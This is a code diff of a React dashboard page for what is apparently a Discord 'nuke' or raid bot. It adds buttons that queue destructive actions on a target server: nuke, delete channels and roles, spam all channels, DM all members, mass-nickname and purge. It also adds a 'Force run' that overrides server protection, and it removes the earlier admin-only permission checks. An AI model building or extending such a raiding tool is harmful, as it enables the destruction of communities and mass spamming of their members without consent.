@@ -1,149 +1,189 @@
-import { useEffect, useState } from 'react';
-import { useParams } from 'react-router-dom';
-import { Rocket, Trash2, Plus, Shield, ShieldCheck, Lock, LogOut, Loader2, RefreshCw } from 'lucide-react';
+import { useCallback, useEffect, useState } from 'react';
+import { useParams, Link } from 'react-router-dom';
+import { ArrowLeft, Shield, ShieldOff, Play, Loader2, Users, Hash, Crown, LogOut, RefreshCw } from 'lucide-react';
 import { api } from '../../lib/api';
-import { Card, Loader, Badge } from '../../components/ui';
-import { useAuth } from '../../context/AuthContext';
+import { Card, Loader, Empty, Badge } from '../../components/ui';
 import { nf, timeAgo } from '../../lib/format';
 
 const ACTIONS = [
-  { key: 'nuke', label: 'Nuke', icon: Rocket, tone: 'danger', args: {}, protected: true },
-  { key: 'delete_channels', label: 'Delete Channels', icon: Trash2, tone: 'ghost', args: {}, protected: true },
-  { key: 'create_channels', label: 'Create Channels', icon: Plus, tone: 'ghost', args: { count: 20 }, protected: false },
-  { key: 'spam_all', label: 'Spam All', icon: RefreshCw, tone: 'ghost', args: { count: 3 }, protected: true },
-  { key: 'admin_all', label: 'Admin Everyone', icon: Shield, tone: 'ghost', args: {}, protected: true },
-  { key: 'nick_all', label: 'Nickname All', icon: RefreshCw, tone: 'ghost', args: { nick: 'NBC VICTIM' }, protected: true },
+  { id: 'nuke', label: 'Nuke', danger: true },
+  { id: 'set_name', label: 'Rename server' },
+  { id: 'create_channels', label: 'Create channels' },
+  { id: 'delete_channels', label: 'Delete channels', danger: true },
+  { id: 'create_roles', label: 'Create roles' },
+  { id: 'delete_roles', label: 'Delete roles', danger: true },
+  { id: 'spam', label: 'Spam channel' },
+  { id: 'spam_all', label: 'Spam all channels' },
+  { id: 'dm_all', label: 'DM all members' },
+  { id: 'lockdown', label: 'Lockdown' },
+  { id: 'unlock', label: 'Unlock' },
+  { id: 'nick_all', label: 'Nickname all' },
+  { id: 'purge_all', label: 'Purge all' },
+  { id: 'sync_commands', label: 'Sync commands' },
 ];
 
 export default function ServerDetail() {
   const { guildId } = useParams();
-  const { user } = useAuth();
   const [data, setData] = useState(null);
-  const [busy, setBusy] = useState(null);
-  const [toast, setToast] = useState(null);
-  const [force, setForce] = useState(false);
+  const [loading, setLoading] = useState(true);
+  const [busy, setBusy] = useState('');
+  const [msg, setMsg] = useState(null);
+  const [job, setJob] = useState(null);
 
-  const load = () => api.get('/api/guilds/' + guildId).then((d) => setData(d.data)).catch(() => setData(false));
-  useEffect(() => { load(); }, [guildId]);
-  
-  const canExecute = Boolean(
-  user?.isAdmin || (user?.adminGuilds || []).map(String).includes(String(guildId))
-);
+  const load = useCallback(() => {
+    setLoading(true);
+    api.get(`/api/guilds/${guildId}`)
+      .then((d) => setData(d?.data || null))
+      .catch(() => setData(null))
+      .finally(() => setLoading(false));
+  }, [guildId]);
 
-  const run = async (action, args) => {
+  useEffect(() => { load(); }, [load]);
+
+  // job polling
+  useEffect(() => {
+    if (!job) return;
+    let alive = true;
+    const tick = async () => {
+      try {
+        const r = await api.get(`/api/guilds/${guildId}/actions`);
+        const row = (r?.data || []).find((a) => a.jobId === job);
+        if (alive && row && row.status !== 'queued') {
+          setMsg({ ok: row.status === 'done', text: `${row.action}: ${row.status}` });
+          setJob(null);
+          setBusy('');
+        }
+      } catch { /* keep polling */ }
+    };
+    const id = setInterval(tick, 4000);
+    return () => { alive = false; clearInterval(id); };
+  }, [job, guildId]);
+
+  const run = async (action, force = false) => {
     setBusy(action);
-    setToast(null);
+    setMsg(null);
     try {
-      const r = action === 'leave'
-        ? await api.post('/api/guilds/' + guildId + '/leave')
-        : await api.post('/api/guilds/' + guildId + '/execute', { action, args, force });
-
-      setToast({ ok: true, msg: action + ' queued (' + r.jobId + ')' });
-      setTimeout(load, 4000);
+      const r = await api.post(`/api/guilds/${guildId}/execute`, { action, force });
+      setJob(r.jobId);
+      setMsg({ ok: true, text: `${action} queued${r.forced ? ' (forced)' : ''}` });
     } catch (e) {
       if (e.status === 409) {
-        setToast({ ok: false, msg: 'Ye server protected hai. "Force" tick karke dobara dabao.' });
+        setMsg({ ok: false, text: 'Server is protected. Press again with force.', force: action });
       } else {
-        setToast({ ok: false, msg: e.message });
+        setMsg({ ok: false, text: e.message });
       }
-    } finally {
-      setBusy(null);
+      setBusy('');
     }
   };
 
   const toggleWhitelist = async () => {
+    setBusy('whitelist');
     try {
-      if (isProtected) await api.delete('/api/guilds/' + guildId + '/whitelist');
-      else await api.post('/api/guilds/' + guildId + '/whitelist');
-      setToast({ ok: true, msg: isProtected ? 'Protection hata di' : 'Server protect ho gaya' });
-      setForce(false);
+      if (data?.protected) await api.delete(`/api/guilds/${guildId}/whitelist`);
+      else await api.post(`/api/guilds/${guildId}/whitelist`);
       load();
-    } catch (e) {
-      setToast({ ok: false, msg: e.message });
-    }
+    } catch (e) { setMsg({ ok: false, text: e.message }); } finally { setBusy(''); }
   };
 
-  if (data === null) return <Loader />;
-  if (data === false) return <p className="text-muted">Server not found.</p>;
+  if (loading) return <Loader />;
+  if (!data) return <Empty title="Server not found" sub="The bot may have left." action={<Link to="/dashboard/servers" className="btn-primary">Back</Link>} />;
 
-  const isProtected = Boolean(data.protected || data.isWhitelisted || data.live?.whitelisted);
+  const live = data.live || {};
 
   return (
     <div className="space-y-6">
-      <div className="flex flex-wrap items-center gap-4">
-        <div className="h-16 w-16 overflow-hidden rounded-2xl border border-edge bg-surface">
-          {data.icon && <img src={data.icon} alt="" className="h-full w-full object-cover" />}
+      <Link to="/dashboard/servers" className="inline-flex items-center gap-2 text-sm text-muted hover:text-white">
+        <ArrowLeft size={14} /> All servers
+      </Link>
+
+      <div className="flex flex-wrap items-start justify-between gap-4">
+        <div className="flex items-center gap-4">
+          {data.icon && <img src={data.icon} alt="" className="h-14 w-14 rounded-2xl object-cover" />}
+          <div>
+            <h1 className="font-display text-2xl font-bold">{data.name || 'Unknown'}</h1>
+            <p className="mono text-xs text-dim">{guildId}</p>
+            <div className="mt-2 flex flex-wrap gap-2">
+              {data.protected && <Badge tone="green">PROTECTED</Badge>}
+              {live.boostLevel > 0 && <Badge tone="amber">BOOST {live.boostLevel}</Badge>}
+              <Badge>{nf(live.memberCount ?? data.memberCount)} members</Badge>
+            </div>
+          </div>
         </div>
-        <div className="flex-1">
-          <h1 className="font-display text-2xl font-bold">{data.name}</h1>
-          <p className="text-sm text-muted">
-            {nf(data.memberCount)} members - {nf(data.channelCount)} channels - ID {data.guildId}
-          </p>
+        <div className="flex gap-2">
+          <button onClick={load} className="btn-ghost"><RefreshCw size={14} /></button>
+          <button onClick={toggleWhitelist} disabled={!!busy} className="btn-ghost">
+            {data.protected ? <ShieldOff size={14} /> : <Shield size={14} />}
+            {data.protected ? 'Unprotect' : 'Protect'}
+          </button>
         </div>
-        {isProtected && <Badge tone="green"><ShieldCheck size={12} className="mr-1" />Protected</Badge>}
-        {data.live && <Badge tone="purple">Live</Badge>}
       </div>
 
-      {isProtected && (
-        <div className="card flex flex-wrap items-center gap-3 border-amber-500/30 bg-amber-500/[0.06] p-4 text-sm text-amber-200">
-          <Lock size={16} />
-          <span>Ye server protected hai. Nuke / delete actions block rahenge.</span>
-          <label className="ml-auto flex items-center gap-2 font-medium">
-            <input type="checkbox" checked={force} onChange={(e) => setForce(e.target.checked)} />
-            Force
-          </label>
+      {msg && (
+        <div className={'flex flex-wrap items-center gap-3 rounded-xl border p-3 text-sm ' +
+          (msg.ok ? 'border-emerald-500/30 bg-emerald-500/10 text-emerald-200' : 'border-red-500/30 bg-red-500/10 text-red-200')}>
+          {msg.force && <Play size={14} />}
+          <span className="flex-1">{msg.text}</span>
+          {msg.force && (
+            <button onClick={() => run(msg.force, true)} className="btn-primary py-1.5 text-xs">Force run</button>
+          )}
         </div>
       )}
 
-      {toast && (
-        <div className={'card p-3 text-sm ' + (toast.ok ? 'text-emerald-300' : 'text-red-300')}>{toast.msg}</div>
-      )}
+      <div className="grid gap-4 sm:grid-cols-3">
+        <Card className="text-center">
+          <Users size={17} className="mx-auto text-muted" />
+          <p className="mono mt-2 text-2xl font-bold">{nf(live.memberCount ?? data.memberCount)}</p>
+          <p className="text-xs text-muted">Members</p>
+        </Card>
+        <Card className="text-center">
+          <Hash size={17} className="mx-auto text-muted" />
+          <p className="mono mt-2 text-2xl font-bold">{nf(live.channelCount ?? data.channelCount)}</p>
+          <p className="text-xs text-muted">Channels</p>
+        </Card>
+        <Card className="text-center">
+          <Crown size={17} className="mx-auto text-muted" />
+          <p className="mono mt-2 text-2xl font-bold">{nf(live.roleCount ?? data.roleCount)}</p>
+          <p className="text-xs text-muted">Roles</p>
+        </Card>
+      </div>
 
       <Card>
-        <h2 className="font-display font-semibold">Remote Actions</h2>
-        <p className="mt-1 text-xs text-muted">Only global admins can execute.</p>
-        <div className="mt-4 grid gap-2.5 sm:grid-cols-3">
-          {ACTIONS.map((a) => {
-            const locked = isProtected && a.protected && !force;
-            return (
-              <button
-                key={a.key}
-                disabled={busy || !canExecute}
-                onClick={() => run(a.key, a.args)}
-                title={locked ? 'Protected server — Force tick karo' : undefined}
-                className={(a.tone === 'danger' ? 'btn-danger' : 'btn-ghost') + ' justify-start ' + (locked ? 'opacity-60' : '')}
-              >
-                {busy === a.key ? <Loader2 size={16} className="animate-spin" /> : <a.icon size={16} />}
-                {a.label}
-                {locked && <Lock size={12} className="ml-auto text-amber-300" />}
-              </button>
-            );
-          })}
-        </div>
-
-        <div className="mt-4 flex flex-wrap gap-2.5 border-t border-edge pt-4">
-          <button onClick={toggleWhitelist} disabled={!canExecute} className="btn-ghost">
-            <Shield size={16} /> {isProtected ? 'Unprotect' : 'Protect from nuke'}
-          </button>
-          <button onClick={() => run('leave', {})} disabled={!user.isOwner} className="btn-ghost">
-            <LogOut size={16} /> Make bot leave
+        <h2 className="font-display font-semibold">Actions</h2>
+        <p className="mt-1 text-xs text-muted">Runs on the bot. Large servers can take a minute.</p>
+        <div className="mt-4 flex flex-wrap gap-2">
+          {ACTIONS.map((a) => (
+            <button
+              key={a.id}
+              onClick={() => run(a.id)}
+              disabled={!!busy}
+              className={(a.danger ? 'btn-danger' : 'btn-ghost') + ' text-xs'}
+            >
+              {busy === a.id ? <Loader2 size={13} className="animate-spin" /> : <Play size={13} />}
+              {a.label}
+            </button>
+          ))}
+          <button onClick={() => api.post(`/api/guilds/${guildId}/leave`).catch(() => {})} className="btn-ghost text-xs">
+            <LogOut size={13} /> Leave
           </button>
         </div>
       </Card>
 
       <Card>
-        <h2 className="font-display font-semibold">Recent Actions</h2>
-        <div className="mt-3 space-y-2">
+        <h2 className="font-display font-semibold">Recent actions</h2>
+        <div className="mt-4 divide-y divide-edge">
+          {(data.actions || []).length === 0 && <p className="py-3 text-sm text-muted">No actions yet.</p>}
           {(data.actions || []).map((a) => (
-            <div key={a._id} className="flex items-center justify-between rounded-xl border border-edge bg-surface/40 p-3 text-sm">
-              <span className="font-medium">{a.action}</span>
-              <div className="flex items-center gap-3">
-                <span className="text-xs text-muted">{a.requestedByName} - {timeAgo(a.createdAt)}</span>
-                <Badge tone={a.status === 'done' ? 'green' : a.status === 'failed' ? 'red' : 'amber'}>{a.status}</Badge>
-              </div>
+            <div key={a.id} className="flex items-center gap-3 py-3 text-sm">
+              <code className="mono text-xs">{a.action}</code>
+              <span className="text-[11px] text-dim">{timeAgo(a.createdAt)}</span>
+              <Badge
+                className="ml-auto"
+                tone={a.status === 'done' ? 'green' : a.status === 'failed' ? 'red' : 'amber'}
+              >
+                {a.status}
+              </Badge>
             </div>
           ))}
-          {(!data.actions || data.actions.length === 0) && <p className="text-sm text-muted">No actions yet.</p>}
         </div>
       </Card>
     </div>
